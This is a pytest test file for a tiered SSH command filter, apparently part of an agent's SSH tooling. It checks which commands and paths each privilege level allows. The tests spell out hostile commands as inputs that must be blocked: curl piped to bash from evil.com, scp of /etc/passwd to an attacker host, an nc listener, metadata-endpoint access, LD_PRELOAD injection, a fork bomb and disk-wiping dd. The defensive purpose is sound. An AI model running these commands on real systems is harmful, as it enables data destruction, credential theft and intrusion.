"""
Tests for SSHCommandFilter — the 5-tier SSH privilege model.

All tests use the example ssh-privilege-levels.yaml.example config so they
exercise real patterns defined in the configuration file without requiring a
live yaml file to be deployed.
"""
import pytest
from pathlib import Path

from src.core.ssh.ssh_command_filter import SSHCommandFilter, SSHFilterResult
from src.core.ssh.ssh_config import SSHHostConfig, SSHSecurityConfig


class TestSSHCommandFilter:
    """Test the SSH command filter privilege model."""

    # -----------------------------------------------------------------------
    # Config loading
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_loads_example_config(self, command_filter):
        """Filter reports config_valid=True after loading the example file."""
        assert command_filter.config_valid

    @pytest.mark.unit
    def test_fail_closed_on_missing_config(self):
        """Filter with a nonexistent config path blocks all commands."""
        f = SSHCommandFilter(config_path=Path("/nonexistent/path.yaml"))
        assert not f.config_valid
        result = f.check_command("uptime", 0)
        assert not result.allowed
        assert result.action == "block"
        assert result.rule == "fail_closed"

    @pytest.mark.unit
    def test_returns_ssh_filter_result(self, command_filter):
        """check_command always returns an SSHFilterResult instance."""
        result = command_filter.check_command("uptime", 0)
        assert isinstance(result, SSHFilterResult)
        assert result.action in ("allow", "block", "requires_approval")
        assert isinstance(result.reason, str)
        assert isinstance(result.rule, str)
        assert isinstance(result.category, str)

    # -----------------------------------------------------------------------
    # L0 monitoring (allowlist mode)
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_l0_allows_uptime(self, command_filter):
        """uptime is in the L0 allowlist."""
        r = command_filter.check_command("uptime", 0)
        assert r.allowed

    @pytest.mark.unit
    def test_l0_allows_df(self, command_filter):
        """df -hT is in the L0 allowlist."""
        r = command_filter.check_command("df -hT", 0)
        assert r.allowed

    @pytest.mark.unit
    def test_l0_allows_free(self, command_filter):
        """free -h is in the L0 allowlist."""
        r = command_filter.check_command("free -h", 0)
        assert r.allowed

    @pytest.mark.unit
    def test_l0_allows_systemctl_status(self, command_filter):
        """systemctl status is in the L0 allowlist."""
        r = command_filter.check_command("systemctl status nginx", 0)
        assert r.allowed

    @pytest.mark.unit
    def test_l0_allows_ps_aux(self, command_filter):
        """ps aux is in the L0 allowlist."""
        r = command_filter.check_command("ps aux", 0)
        assert r.allowed

    @pytest.mark.unit
    def test_l0_blocks_rm(self, command_filter):
        """rm is NOT in the L0 allowlist — blocked by default."""
        r = command_filter.check_command("rm -rf /tmp/data", 0)
        assert not r.allowed

    @pytest.mark.unit
    def test_l0_blocks_sudo(self, command_filter):
        """sudo is not in the L0 allowlist."""
        r = command_filter.check_command("sudo systemctl restart nginx", 0)
        assert not r.allowed

    @pytest.mark.unit
    def test_l0_blocks_arbitrary_command(self, command_filter):
        """An unlisted command is blocked at L0."""
        r = command_filter.check_command("cat /etc/shadow", 0)
        assert not r.allowed

    # -----------------------------------------------------------------------
    # L1 service management
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_l1_allows_service_restart(self, command_filter):
        """sudo systemctl restart is allowed at L1."""
        r = command_filter.check_command("sudo systemctl restart nginx", 1)
        assert r.allowed

    @pytest.mark.unit
    def test_l1_allows_service_reload(self, command_filter):
        """sudo service reload is allowed at L1."""
        r = command_filter.check_command("sudo service nginx reload", 1)
        assert r.allowed

    @pytest.mark.unit
    def test_l1_inherits_l0_uptime(self, command_filter):
        """L1 inherits L0 allowlist — uptime is allowed."""
        r = command_filter.check_command("uptime", 1)
        assert r.allowed

    @pytest.mark.unit
    def test_l1_inherits_l0_df(self, command_filter):
        """L1 inherits L0 allowlist — df is allowed."""
        r = command_filter.check_command("df -hT", 1)
        assert r.allowed

    @pytest.mark.unit
    def test_l1_blocks_arbitrary_sudo(self, command_filter):
        """Arbitrary sudo not in sudo_restricted_to is blocked at L1."""
        r = command_filter.check_command("sudo cat /etc/shadow", 1)
        assert not r.allowed

    @pytest.mark.unit
    def test_l1_blocks_rm(self, command_filter):
        """rm is still blocked at L1 (not in any allowlist)."""
        r = command_filter.check_command("rm -rf /var/log/app.log", 1)
        assert not r.allowed

    # -----------------------------------------------------------------------
    # L2 configuration (path-restricted writes)
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_l2_allows_write_to_nginx_config(self, command_filter):
        """Writing to /etc/nginx/ is allowed at L2."""
        r = command_filter.check_path_writable("/etc/nginx/nginx.conf", 2)
        assert r.allowed

    @pytest.mark.unit
    def test_l2_blocks_write_to_shadow(self, command_filter):
        """/etc/shadow is in blocked_paths — denied at L2."""
        r = command_filter.check_path_writable("/etc/shadow", 2)
        assert not r.allowed

    @pytest.mark.unit
    def test_l2_blocks_write_to_sudoers(self, command_filter):
        """/etc/sudoers is in blocked_paths — denied at L2."""
        r = command_filter.check_path_writable("/etc/sudoers", 2)
        assert not r.allowed

    @pytest.mark.unit
    def test_l2_blocks_write_outside_writable_paths(self, command_filter):
        """/opt/app/config.yml is not in writable_paths at L2 — denied."""
        r = command_filter.check_path_writable("/opt/app/config.yml", 2)
        assert not r.allowed

    # -----------------------------------------------------------------------
    # L3 administration (blocklist mode)
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_l3_allows_most_commands(self, command_filter):
        """apt update is not in the L3 blocklist — allowed."""
        r = command_filter.check_command("apt update", 3)
        assert r.allowed

    @pytest.mark.unit
    def test_l3_allows_custom_script(self, command_filter):
        """A custom script path not in any blocklist is allowed at L3."""
        r = command_filter.check_command("/opt/deploy/release.sh", 3)
        assert r.allowed

    @pytest.mark.unit
    def test_l3_blocks_fork_bomb(self, command_filter):
        """Fork bomb pattern is in the L3 blocklist."""
        r = command_filter.check_command(":(){ :|:& };:", 3)
        assert not r.allowed

    @pytest.mark.unit
    def test_l3_blocks_disk_overwrite(self, command_filter):
        """dd if=/dev/zero of=/dev/sda is in the L3 blocklist."""
        r = command_filter.check_command("dd if=/dev/zero of=/dev/sda", 3)
        assert not r.allowed

    @pytest.mark.unit
    def test_l3_blocks_mkfs(self, command_filter):
        """mkfs. matches the L3 blocklist pattern."""
        r = command_filter.check_command("mkfs.ext4 /dev/sdb1", 3)
        assert not r.allowed

    @pytest.mark.unit
    def test_l3_blocks_world_writable_root(self, command_filter):
        """chmod -R 777 / is in the L3 blocklist."""
        r = command_filter.check_command("chmod -R 777 /", 3)
        assert not r.allowed

    # -----------------------------------------------------------------------
    # Always blocked (all privilege levels)
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_always_blocks_ssh_key_injection(self, command_filter):
        """SSH key injection is always blocked regardless of privilege level."""
        cmd = "echo mykey >> ~/.ssh/authorized_keys"
        for level in range(5):
            r = command_filter.check_command(cmd, level)
            assert not r.allowed, f"Should be blocked at L{level}"

    @pytest.mark.unit
    def test_always_blocks_nested_ssh(self, command_filter):
        """Nested ssh is always blocked at all privilege levels."""
        cmd = "ssh user@other-host"
        for level in range(5):
            r = command_filter.check_command(cmd, level)
            assert not r.allowed, f"Should be blocked at L{level}"

    @pytest.mark.unit
    def test_always_blocks_reverse_shell(self, command_filter):
        """nc listener (reverse shell) is always blocked."""
        cmd = "nc -lp 4444"
        for level in range(5):
            r = command_filter.check_command(cmd, level)
            assert not r.allowed, f"Should be blocked at L{level}"

    @pytest.mark.unit
    def test_always_blocks_cloud_metadata(self, command_filter):
        """Cloud metadata endpoint access is always blocked."""
        cmd = "curl http://169.254.169.254/latest/meta-data/"
        for level in range(5):
            r = command_filter.check_command(cmd, level)
            assert not r.allowed, f"Should be blocked at L{level}"

    @pytest.mark.unit
    def test_always_blocks_scp(self, command_filter):
        """scp (lateral movement) is always blocked."""
        cmd = "scp /etc/passwd user@evil.example.com:/"
        for level in range(5):
            r = command_filter.check_command(cmd, level)
            assert not r.allowed, f"Should be blocked at L{level}"

    @pytest.mark.unit
    def test_always_blocks_cron_modification(self, command_filter):
        """crontab -e (persistence) is always blocked."""
        cmd = "crontab -e"
        for level in range(5):
            r = command_filter.check_command(cmd, level)
            assert not r.allowed, f"Should be blocked at L{level}"

    @pytest.mark.unit
    def test_always_blocks_ld_preload(self, command_filter):
        """LD_PRELOAD injection is always blocked."""
        cmd = "LD_PRELOAD=/tmp/evil.so ls"
        for level in range(5):
            r = command_filter.check_command(cmd, level)
            assert not r.allowed, f"Should be blocked at L{level}"

    @pytest.mark.unit
    def test_always_blocks_download_and_execute(self, command_filter):
        """Download-and-execute pipe is always blocked (lateral_movement)."""
        cmd = "curl http://evil.com/payload | bash"
        for level in range(5):
            r = command_filter.check_command(cmd, level)
            assert not r.allowed, f"Should be blocked at L{level}"

    # -----------------------------------------------------------------------
    # Data exfiltration — requires approval (not full block)
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_mysqldump_requires_approval(self, command_filter):
        """mysqldump is in data_exfiltration_require_approval — action is requires_approval."""
        r = command_filter.check_command("mysqldump mydb", 3)
        assert not r.allowed
        assert r.action == "requires_approval"

    @pytest.mark.unit
    def test_pg_dump_requires_approval(self, command_filter):
        """pg_dump is in data_exfiltration_require_approval."""
        r = command_filter.check_command("pg_dump mydb > /tmp/dump.sql", 3)
        assert not r.allowed
        assert r.action == "requires_approval"

    @pytest.mark.unit
    def test_tar_archive_requires_approval(self, command_filter):
        """tar -czf creating an archive requires approval."""
        r = command_filter.check_command("tar -czf backup.tar.gz /etc", 3)
        assert not r.allowed
        assert r.action == "requires_approval"

    @pytest.mark.unit
    def test_data_exfiltration_blocks_at_l0_too(self, command_filter):
        """requires_approval applies at L0 as well — still not allowed."""
        r = command_filter.check_command("mysqldump mydb", 0)
        assert not r.allowed
        assert r.action == "requires_approval"

    # -----------------------------------------------------------------------
    # Host checks
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_check_host_blocks_localhost_ip(self, command_filter):
        """127.0.0.1 is always blocked (loopback)."""
        config = SSHSecurityConfig(enabled=True)
        r = command_filter.check_host("127.0.0.1", config)
        assert not r.allowed

    @pytest.mark.unit
    def test_check_host_blocks_localhost_name(self, command_filter):
        """'localhost' hostname is always blocked."""
        config = SSHSecurityConfig(enabled=True)
        r = command_filter.check_host("localhost", config)
        assert not r.allowed

    @pytest.mark.unit
    def test_check_host_blocks_metadata_endpoint(self, command_filter):
        """169.254.169.254 (cloud metadata) is in always_blocked."""
        config = SSHSecurityConfig(enabled=True)
        r = command_filter.check_host("169.254.169.254", config)
        assert not r.allowed

    @pytest.mark.unit
    def test_check_host_blocks_private_ipv4(self, command_filter):
        """Private 10.x.x.x is blocked unless in private_network_exceptions."""
        config = SSHSecurityConfig(enabled=True)
        r = command_filter.check_host("10.0.0.1", config)
        assert not r.allowed

    @pytest.mark.unit
    def test_check_host_allows_public_ip(self, command_filter):
        """A public IP (93.184.216.34) is allowed with default config."""
        config = SSHSecurityConfig(enabled=True)
        r = command_filter.check_host("93.184.216.34", config)
        assert r.allowed

    @pytest.mark.unit
    def test_check_host_allows_exception(self, command_filter):
        """A private IP listed in private_network_exceptions is allowed."""
        config = SSHSecurityConfig(
            enabled=True,
            hosts=SSHHostConfig(
                private_network_exceptions=["192.168.1.100"],
            ),
        )
        r = command_filter.check_host("192.168.1.100", config)
        assert r.allowed

    @pytest.mark.unit
    def test_check_host_returns_ssh_filter_result(self, command_filter):
        """check_host returns an SSHFilterResult with the expected fields."""
        config = SSHSecurityConfig(enabled=True)
        r = command_filter.check_host("93.184.216.34", config)
        assert isinstance(r, SSHFilterResult)
        assert r.action in ("allow", "block")
        assert isinstance(r.reason, str)

    # -----------------------------------------------------------------------
    # Path writability checks
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_path_writable_denied_at_l0(self, command_filter):
        """L0 has no write access — all paths denied."""
        r = command_filter.check_path_writable("/etc/nginx/nginx.conf", 0)
        assert not r.allowed

    @pytest.mark.unit
    def test_path_writable_denied_at_l1(self, command_filter):
        """L1 has no write access — all paths denied."""
        r = command_filter.check_path_writable("/etc/nginx/nginx.conf", 1)
        assert not r.allowed

    @pytest.mark.unit
    def test_path_writable_allowed_at_l2_for_nginx(self, command_filter):
        """/etc/nginx/ is in writable_paths — allowed at L2."""
        r = command_filter.check_path_writable("/etc/nginx/nginx.conf", 2)
        assert r.allowed

    @pytest.mark.unit
    def test_path_writable_allowed_at_l2_for_mysql(self, command_filter):
        """/etc/mysql/ is in writable_paths — allowed at L2."""
        r = command_filter.check_path_writable("/etc/mysql/my.cnf", 2)
        assert r.allowed

    @pytest.mark.unit
    def test_path_writable_blocked_for_shadow(self, command_filter):
        """/etc/shadow is in blocked_paths — denied even at L2."""
        r = command_filter.check_path_writable("/etc/shadow", 2)
        assert not r.allowed

    @pytest.mark.unit
    def test_path_writable_blocked_for_passwd(self, command_filter):
        """/etc/passwd is in blocked_paths — denied even at L2."""
        r = command_filter.check_path_writable("/etc/passwd", 2)
        assert not r.allowed

    @pytest.mark.unit
    def test_path_writable_blocked_for_sshd_config(self, command_filter):
        """/etc/ssh/sshd_config is in blocked_paths — denied at L2."""
        r = command_filter.check_path_writable("/etc/ssh/sshd_config", 2)
        assert not r.allowed

    @pytest.mark.unit
    def test_path_writable_allowed_at_l3(self, command_filter):
        """L3 is blocklist mode — arbitrary paths allowed unless in blocked_paths."""
        r = command_filter.check_path_writable("/opt/app/config.yml", 3)
        assert r.allowed

    @pytest.mark.unit
    def test_path_writable_blocked_at_l3_for_protected_path(self, command_filter):
        """/etc/shadow is still blocked at L3 via check_path_writable."""
        r = command_filter.check_path_writable("/etc/shadow", 3)
        assert not r.allowed

    # -----------------------------------------------------------------------
    # get_allowed_operations
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_get_allowed_operations_l0(self, command_filter):
        """L0 returns a non-empty list of allowed operations."""
        ops = command_filter.get_allowed_operations(0)
        assert len(ops) > 0
        assert all("pattern" in op for op in ops)

    @pytest.mark.unit
    def test_get_allowed_operations_l0_has_descriptions(self, command_filter):
        """L0 operations include a description field."""
        ops = command_filter.get_allowed_operations(0)
        assert all("description" in op for op in ops)

    @pytest.mark.unit
    def test_get_allowed_operations_l1_superset_of_l0(self, command_filter):
        """L1 has at least as many operations as L0 (inherited allowlist)."""
        ops_l0 = command_filter.get_allowed_operations(0)
        ops_l1 = command_filter.get_allowed_operations(1)
        assert len(ops_l1) >= len(ops_l0)

    @pytest.mark.unit
    def test_get_allowed_operations_invalid_level_clamps(self, command_filter):
        """Privilege level -1 clamps to 0, 99 clamps to 4 — no exception raised."""
        ops_low = command_filter.get_allowed_operations(-1)
        ops_high = command_filter.get_allowed_operations(99)
        assert isinstance(ops_low, list)
        assert isinstance(ops_high, list)

    # -----------------------------------------------------------------------
    # Edge cases and boundary conditions
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_empty_command_blocked_at_l0(self, command_filter):
        """An empty command string is blocked at L0 (no allowlist match)."""
        r = command_filter.check_command("", 0)
        assert not r.allowed

    @pytest.mark.unit
    def test_very_long_command_does_not_crash(self, command_filter):
        """A very long command string is handled without raising an exception."""
        long_cmd = "echo " + "A" * 10_000
        r = command_filter.check_command(long_cmd, 3)
        assert isinstance(r, SSHFilterResult)

    @pytest.mark.unit
    def test_case_insensitive_pattern_matching(self, command_filter):
        """Pattern matching is case-insensitive (re.IGNORECASE)."""
        # SSH key injection pattern should match regardless of case
        r_lower = command_filter.check_command(
            "echo key >> /home/user/.ssh/authorized_keys", 3
        )
        assert not r_lower.allowed

    @pytest.mark.unit
    def test_l3_action_is_allow_for_permitted_command(self, command_filter):
        """Permitted L3 command returns action='allow'."""
        r = command_filter.check_command("apt update", 3)
        assert r.action == "allow"

    @pytest.mark.unit
    def test_blocked_command_action_is_block(self, command_filter):
        """Blocked command returns action='block' (not requires_approval)."""
        r = command_filter.check_command("nc -lp 4444", 0)
        assert r.action == "block"

    @pytest.mark.unit
    def test_fail_closed_returns_expected_fields(self):
        """Fail-closed result has all required SSHFilterResult fields set."""
        f = SSHCommandFilter(config_path=Path("/nonexistent/path.yaml"))
        r = f.check_command("uptime", 0)
        assert r.rule == "fail_closed"
        assert r.category == "config_error"
        assert "fail-closed" in r.reason.lower() or "invalid" in r.reason.lower()

    # -----------------------------------------------------------------------
    # Path matching — no substring false positives
    # -----------------------------------------------------------------------

    @pytest.mark.unit
    def test_path_appears_in_command_exact(self):
        """Config path '/etc/nginx' matches at word boundary in command."""
        assert SSHCommandFilter._path_appears_in_command(
            "/etc/nginx", "cat /etc/nginx/nginx.conf"
        )

    @pytest.mark.unit
    def test_path_appears_in_command_no_substring(self):
        """Config path '/etc/nginx' does NOT match '/notetc/nginx' (substring)."""
        assert not SSHCommandFilter._path_appears_in_command(
            "/etc/nginx", "cat /notetc/nginx/nginx.conf"
        )

    @pytest.mark.unit
    def test_path_appears_in_command_no_embedded_prefix(self):
        """Config path '/etc/nginx' does NOT match '/tmp/etc/nginx'."""
        assert not SSHCommandFilter._path_appears_in_command(
            "/etc/nginx", "cat /tmp/etc/nginx/conf"
        )

    @pytest.mark.unit
    def test_path_appears_in_command_quoted_path(self):
        """Config path matches inside single or double quotes."""
        assert SSHCommandFilter._path_appears_in_command(
            "/etc/nginx", "cat '/etc/nginx/nginx.conf'"
        )
        assert SSHCommandFilter._path_appears_in_command(
            "/etc/nginx", 'cat "/etc/nginx/nginx.conf"'
        )

    @pytest.mark.unit
    def test_path_is_under_exact_match(self):
        """Path equals config directory exactly."""
        assert SSHCommandFilter._path_is_under("/etc/nginx", "/etc/nginx")

    @pytest.mark.unit
    def test_path_is_under_subpath(self):
        """Subpath of config directory matches."""
        assert SSHCommandFilter._path_is_under(
            "/etc/nginx/sites/default", "/etc/nginx"
        )

    @pytest.mark.unit
    def test_path_is_under_trailing_slash(self):
        """Config path with trailing slash still matches."""
        assert SSHCommandFilter._path_is_under(
            "/etc/nginx/conf.d/app.conf", "/etc/nginx/"
        )

    @pytest.mark.unit
    def test_path_is_under_no_false_prefix(self):
        """'/etc/nginxtra' is NOT under '/etc/nginx' (no separator)."""
        assert not SSHCommandFilter._path_is_under(
            "/etc/nginxtra/conf", "/etc/nginx"
        )

    @pytest.mark.unit
    def test_path_is_under_unrelated(self):
        """Completely unrelated path does not match."""
        assert not SSHCommandFilter._path_is_under(
            "/opt/app/config.yml", "/etc/nginx"
        )

    @pytest.mark.unit
    def test_l2_command_path_no_substring_false_positive(self, command_filter):
        """L2 check_command doesn't false-positive on substring path in command."""
        # '/etc/nginx/' is writable, but '/fake/etc/nginx/' should not match
        r = command_filter.check_command(
            "echo test > /fake/etc/nginx/site.conf", 2
        )
        # Should be blocked (no allowlist match), NOT allowed via writable_path
        assert not r.allowed

    @pytest.mark.unit
    def test_check_path_writable_no_prefix_false_positive(self, command_filter):
        """check_path_writable doesn't match '/etc/nginxtra' against '/etc/nginx/'."""
        r = command_filter.check_path_writable("/etc/nginxtra/conf", 2)
        assert not r.allowed
        # Should be denied because path is not in writable_paths,
        # NOT allowed as a writable_path match
        assert r.rule == "L2_configuration:not_in_writable_paths"
